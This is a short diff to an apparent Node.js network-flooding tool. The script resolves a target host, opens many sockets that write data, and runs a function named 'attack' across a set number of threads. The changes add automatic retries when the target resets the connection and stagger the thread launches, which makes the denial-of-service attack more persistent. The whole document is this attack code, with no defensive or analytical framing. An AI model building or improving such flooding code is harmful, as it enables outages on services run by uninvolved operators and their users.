@@ -27,7 +27,12 @@ dns.lookup(_url.hostname, {family: 4}, function (err, address) {
       socket.write(data)
     });
     socket.on('error', function (err) {
-      console.error(err.code);
+      if ('ECONNRESET' === err.code) {
+        setTimeout(attack, 5000);
+      }
+      else {
+        console.error(err);
+      }
     });
     socket.on('data', function (chuck) {
       loadDataAmount += chuck.length;
@@ -48,7 +53,7 @@ dns.lookup(_url.hostname, {family: 4}, function (err, address) {
   }
   else {
     for(let i = 0; i < threadsCount; i++) {
-      attack();
+      setTimeout(attack, i * 20);
     }
   }
 });
